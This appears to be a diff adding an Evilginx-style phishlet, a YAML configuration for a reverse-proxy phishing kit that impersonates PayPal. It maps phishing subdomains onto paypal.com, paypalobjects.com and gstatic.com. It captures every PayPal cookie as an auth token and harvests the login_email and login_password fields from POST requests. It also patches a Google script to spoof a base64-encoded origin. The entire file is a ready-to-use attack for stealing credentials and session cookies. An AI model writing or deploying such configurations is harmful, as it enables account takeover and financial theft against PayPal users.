@@ -1,0 +1,36 @@
+min_ver: '3.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paypal.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'paypal.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ddbm2', orig_sub: 'ddbm2', domain: 'paypal.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'paypalobjects.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'paypalobjects.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'c6', orig_sub: 'c6', domain: 'paypal.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'slc.stats', orig_sub: 'slc.stats', domain: 'paypal.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: '', orig_sub: '', domain: '', search: '', replace: '', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'google.com', search: 'A=si&&!d\?lX\.btoa\(y\):S\[6]\(40,l\[0],O\[l\[1]]\(24,0,8,y\),d\)', replace: 'A="aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw."', mimes: ['text/javascript']}
+auth_tokens:
+  - domain: '.paypal.com'
+    keys: ['.*,regexp']
+  - domain: 'www.paypal.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/myaccount/summary'
+  - '/myaccount/.*'
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'paypal.com'
+  path: '/signin'
